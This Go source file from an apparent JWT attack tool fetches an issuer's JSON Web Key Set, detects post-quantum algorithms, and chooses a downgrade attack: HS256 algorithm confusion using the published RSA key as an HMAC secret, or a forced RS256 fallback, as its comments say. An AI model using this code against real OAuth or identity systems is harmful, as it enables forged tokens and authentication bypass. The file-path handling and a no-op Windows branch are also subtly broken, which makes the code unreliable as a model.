package oauth2

import (
	"context"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

// JWKS is the JSON Web Key Set document from an issuer's jwks_uri.
type JWKS struct {
	Keys []JWK `json:"keys"`
}

// JWK is one signing key entry.
type JWK struct {
	Kty string `json:"kty"`      // RSA, EC, oct
	Alg string `json:"alg"`      // RS256, HS256, Kyber512-Dilithium3, ...
	Kid string `json:"kid"`      // key id
	N   string `json:"n,omitempty"`
	E   string `json:"e,omitempty"`
	// PQ signals post-quantum capability (custom/vendor extension —
	// some Entra/federation stacks advertise `pq: true` or PQ algs).
	PQ bool `json:"pq,omitempty"`
}

// PQAlgoMarkers are substrings that mark a post-quantum algorithm
// (covers common spellings: Kyber512, ML-KEM-768, Dilithium3, ML-DSA-44).
var PQAlgoMarkers = []string{"kyber", "dilithium", "falcon", "sphincs", "mldsa", "mlkem", "ml-dsa", "ml-kem", "pq"}

// IsPQCAlg reports whether an algorithm name denotes post-quantum crypto.
func IsPQCAlg(alg string) bool {
	la := strings.ToLower(alg)
	for _, m := range PQAlgoMarkers {
		if strings.Contains(la, m) {
			return true
		}
	}
	return false
}

// FetchJWKS retrieves the JWKS document from a jwks_uri. Both https://
// and file:// (local cached copy) schemes are supported.
func FetchJWKS(ctx context.Context, client *http.Client, jwksURI string) (*JWKS, error) {
	if strings.HasPrefix(jwksURI, "file://") {
		path := strings.TrimPrefix(strings.TrimPrefix(jwksURI, "file://"), "/")
		if runtime.GOOS == "windows" && len(path) > 1 && path[1] == ':' {
			// file:///C:/x → C:/x (leading slash before drive letter removed above)
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil, fmt.Errorf("read jwks file: %w", err)
		}
		jwks := &JWKS{}
		if err := json.Unmarshal(data, jwks); err != nil {
			return nil, fmt.Errorf("parse jwks: %w", err)
		}
		return jwks, nil
	}

	if client == nil {
		client = &http.Client{Timeout: 15 * time.Second}
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwksURI, nil)
	if err != nil {
		return nil, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("fetch jwks: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("jwks http %d", resp.StatusCode)
	}

	jwks := &JWKS{}
	if err := json.Unmarshal(body, jwks); err != nil {
		return nil, fmt.Errorf("parse jwks: %w", err)
	}
	return jwks, nil
}

// DowngradeDecision captures the PQC fallback analysis.
type DowngradeDecision struct {
	PQCDetected   bool     `json:"pqc_detected"`
	PQCAlgs       []string `json:"pqc_algs,omitempty"`
	DowngradeAlg  string   `json:"downgrade_alg"` // RS256 (classic) or HS256 (HMAC confusion)
	FallbackViable bool    `json:"fallback_viable"`
	RSAPubKey     *rsa.PublicKey `json:"-"`
	Note          string   `json:"note"`
}

// DetectAndDowngrade inspects a JWKS for post-quantum algorithms and
// returns the strongest classic fallback: HS256 when the RSA public
// key is present (the alg-confusion path from ConfuseJWT), otherwise
// RS256 as the classic downgrade target.
//
// The exploit class: stacks that advertise PQC (Kyber/Dilithium) but
// still accept classic algorithms on the fallback path — the token's
// `alg` header selects the verifier path, and a downgrade there is the
// whole attack.
func DetectAndDowngrade(jwks *JWKS) (*DowngradeDecision, error) {
	if jwks == nil || len(jwks.Keys) == 0 {
		return nil, fmt.Errorf("empty jwks")
	}

	d := &DowngradeDecision{DowngradeAlg: "RS256"}

	for _, k := range jwks.Keys {
		if IsPQCAlg(k.Alg) || k.PQ {
			d.PQCDetected = true
			d.PQCAlgs = append(d.PQCAlgs, k.Alg)
		}
		if k.Kty == "RSA" && d.RSAPubKey == nil {
			if pub, err := jwkToRSA(k); err == nil {
				d.RSAPubKey = pub
			}
		}
	}

	if d.PQCDetected {
		// Classic fallback: RS256 is universally accepted by verifiers
		// that once supported it; HS256 becomes viable when the RSA
		// public key doubles as an HMAC secret (alg confusion).
		if d.RSAPubKey != nil {
			d.DowngradeAlg = "HS256"
			d.FallbackViable = true
			d.Note = "PQC advertised with RSA key published: HS256 alg-confusion viable (key as HMAC secret); RS256 classic fallback also available."
		} else {
			d.FallbackViable = true
			d.Note = "PQC advertised without an RSA key in JWKS: force RS256 via alg-header downgrade if the verifier retains its legacy path."
		}
	} else {
		d.Note = "No PQC algorithms advertised; classic algs already in use."
	}
	return d, nil
}

// jwkToRSA converts an RSA JWK to a crypto public key.
func jwkToRSA(k JWK) (*rsa.PublicKey, error) {
	if k.Kty != "RSA" || k.N == "" || k.E == "" {
		return nil, fmt.Errorf("not an RSA JWK")
	}
	nBytes, err := base64.RawURLEncoding.DecodeString(k.N)
	if err != nil {
		return nil, fmt.Errorf("decode n: %w", err)
	}
	eBytes, err := base64.RawURLEncoding.DecodeString(k.E)
	if err != nil {
		return nil, fmt.Errorf("decode e: %w", err)
	}
	e := 0
	for _, b := range eBytes {
		e = e*256 + int(b)
	}
	if e == 0 {
		return nil, fmt.Errorf("zero exponent")
	}
	return &rsa.PublicKey{N: new(big.Int).SetBytes(nBytes), E: e}, nil
}
